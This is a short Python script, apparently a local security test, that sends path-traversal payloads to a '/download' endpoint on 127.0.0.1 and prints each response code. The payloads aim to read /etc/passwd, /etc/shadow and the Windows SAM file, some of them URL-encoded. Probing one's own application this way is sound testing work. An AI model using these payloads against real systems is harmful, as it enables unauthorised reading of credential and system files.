import requests 

url = "http://127.0.0.1:5000/download"


path_traversal_payloads = [
    "../",                          
    "../../",                       
    "../../../etc/passwd",         
    "../../../../../../etc/shadow", 
    "..\\..\\windows\\system32\\config\\sam", 
    "%2e%2e%2f%2e%2e%2f",          
    "..%2f..%2f etc/passwd",        
]


for payload in path_traversal_payloads:
    response = requests.get(url, params={"filename": payload})
    print(f"Payload: {payload} | Response Code: {response.status_code}")
